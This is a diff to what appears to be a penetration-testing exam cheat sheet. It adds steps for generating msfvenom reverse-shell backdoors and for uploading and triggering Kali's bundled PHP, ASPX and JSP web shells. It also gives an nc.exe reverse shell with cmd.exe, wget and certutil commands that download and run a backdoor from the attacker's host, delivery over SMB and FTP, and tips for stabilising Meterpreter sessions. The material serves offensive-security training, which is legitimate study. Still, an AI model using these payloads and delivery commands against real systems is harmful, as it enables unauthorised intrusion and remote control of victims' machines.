@@ -307,55 +307,128 @@ hydra -L <user_file> -P <password_file> //<target_ip> mysql
 
 ### MSFVenom Payloads Generation
 
-- Linux (ELF):
+- Linux (ELF)
+  ```bash
+  msfvenom -p linux/shell_reverse_tcp LHOST=<attack_ip> LPORT=<random_port> -f elf -o backdoor.elf
+  ```
+- Windows (EXE)
+  ```bash
+  msfvenom -p windows/shell_reverse_tcp LHOST=<attack_ip> LPORT=<random_port> -f exe -o backdoor.exe
+  ```
 
-    ```bash
-    msfvenom -p linux/meterpreter/rever_tcp LHOST=<attack_ip> LPORT=<random_port> -f elf -o backdoor.elf
+### Built-in Payloads on Kali
+
+Kali ships ready-to-use web shells and binaries under /usr/share. Below are the most exam-relevant items.
+
+#### Web Shells
+
+- PHP reverse shell
+  - Path: `/usr/share/webshells/php/php-reverse-shell.php`
+  - OODA:
+    - Observe: PHP web server; file upload found.
+    - Orient: Reverse shell needed (outbound usually allowed).
+    - Decide: Use bundled php-reverse-shell.php.
+    - Act:
+      1. Copy and edit LHOST & LPORT in the file.
+      2. Upload.
+      3. Start listener: `nc -lvnp <LPORT>` or Metasploit multi/handler.
+      4. Browse to the uploaded file to trigger.
+
+- ASPX command shell
+  - Path: `/usr/share/webshells/aspx/cmdasp.aspx`
+  - OODA:
+    - Observe: IIS/.aspx; file upload exists.
+    - Orient: Simple HTTP web shell is often more reliable than reverse shell.
+    - Decide: Upload cmdasp.aspx for initial exec.
+    - Act:
+      1. Upload.
+      2. Browse to it.
+      3. Run commands: `http://<target_ip>/uploads/cmdasp.aspx?cmd=whoami`.
+      4. Use foothold to fetch a more robust shell.
+
+- JSP reverse shell
+  - Path: `/usr/share/webshells/jsp/jsp-reverse.jsp`
+  - OODA:
+    - Observe: Tomcat/Java service; upload or manager creds.
+    - Orient: Deploy a WAR containing the JSP shell.
+    - Decide: Package and deploy JSP shell.
+    - Act:
+      1. Edit LHOST & LPORT in JSP.
+      2. Place in `shell/` and package: `jar -cvf shell.war -C shell .` (or `zip -r shell.war shell/`).
+      3. Deploy via Tomcat Manager.
+      4. Start listener and open `http://<target_ip>/shell/jsp-reverse.jsp`.
+
+#### Windows Binaries
+
+- Netcat (nc.exe)
+  - Path: `/usr/share/windows-resources/binaries/nc.exe`
+  - OODA:
+    - Observe: Have RCE but no interactive shell.
+    - Orient: nc.exe supports `-e` to attach cmd.exe.
+    - Decide: Use nc.exe for a reverse shell.
+    - Act:
+      1. Serve file (e.g., `python3 -m http.server`).
+      2. Start listener: `nc -lvnp <port>` (or Metasploit multi/handler).
+      3. Execute on target: `C:\\Windows\\Temp\\nc.exe <attack_ip> <port> -e cmd.exe`.
+
+### Payload Delivery
+
+- HTTP server on attacker
+  ```bash
+  python3 -m http.server 8080
+  ```
+- Linux victim: download + execute
+  ```bash
+  wget http://<attack_ip>/backdoor.elf -O /tmp/backdoor.elf && chmod +x /tmp/backdoor.elf && /tmp/backdoor.elf
+  ```
+- Windows victim: download + execute
+  ```cmd
+  certutil -urlcache -split -f http://<attack_ip>/backdoor.exe C:\\Windows\\Temp\\backdoor.exe && C:\\Windows\\Temp\\backdoor.exe
+  ```
+- Via SMB
+  ```bash
+  smbclient //<target_ip>/<ShareName> -N
+  put backdoor.exe
+  # or
+  smbclient //<target_ip>/<ShareName> -U 'username%password'
+  put backdoor.exe
+  ```
+- Via FTP
+  ```bash
+  ftp <target_ip>
+  binary
+  put backdoor.exe
+  ```
+
+### Payload Troubleshooting
+
+- Step 1: Staged vs. stageless
+  - Staged (…/meterpreter/reverse_tcp): small loader then downloads stage; needs two connections.
+  - Stageless (…/meterpreter_reverse_tcp): self-contained; one connection.
+  - If staged fails, switch to stageless first.
+
+- Step 2: Architecture (x64 vs. x86)
+  - Detect: Windows: `systeminfo | findstr /C:"System Type"`; Linux: `uname -m`.
+  - Rule: x86 payload runs on x64; x64 payload will not run on x86.
+  - Errors like “exec format error”/“Not a valid Win32 application” imply mismatch. Default to x86 unless you need x64.
+
+- Step 3: Connection type (reverse vs. bind)
+  - Default: reverse shell. If LPORT 4444 fails, try `80`, then `443`.
+  - Consider bind shell only if outbound is blocked and an inbound port is reachable.
+
+- Step 4: Meterpreter vs. standard shell
+  - If Meterpreter dies/stalls, switch to standard shell for stability:
+    ```text
+    msf6 > set PAYLOAD windows/shell_reverse_tcp
+    msf6 > exploit
+    ```
+  - Upgrade later if needed:
+    ```text
+    msf6 > background
+    msf6 > use post/multi/manage/shell_to_meterpreter
+    msf6 > set SESSION 1
+    msf6 > run
     ```
 
-- Windows (exe):
-
-    ```bash
-    msfvenom -p windows/meterpreter/rever_tcp LHOST=<attack_ip> LPORT=<random_port> -f exe -o backdoor.exe
-    ```
-
-### Payloads Delivery
-
-- Run a HTTP server on the attack machine
-
-    ```bash
-    python3 -m http.server 8080
-    ```
-
-- Linux Victim Download and Execution
-
-    ```bash
-    wget http://<attack_ip>/backdoor.elf -O /tmp/backdoor.elf && chmod +x /tmp/backdoor.elf && /tmp/backdoor.elf
-    ```
-
-- Windows Victim Download and Execution
-
-    ```cmd
-    certutil -urlcache -split -f http://<attack_ip>/backdoor.exe C:\Windows\Temp\backdoor.exe && C:\Windows\Temp\backdoor.exe
-    ```
-
-- Deliver Through SMB Services
-
-    ```bash
-    smbclient //<target_ip>/<ShareName> -N
-    put backdoor.exe
-    ```
-    OR
-    ```bash
-    smbclient //<target_ip>/<ShareName> -U 'username%password'
-    put backdoor.exe
-    ```
-
-- Deliver Through FTP Service
-
-    ```bash
-    ftp <target_ip>
-    ftp > binary
-    ftp > put backdoor.exe
-    ```
+This uses the stable shell (Session 1) to upload and run a new Meterpreter payload, yielding a fresh Meterpreter session (Session 2) with higher reliability.
 
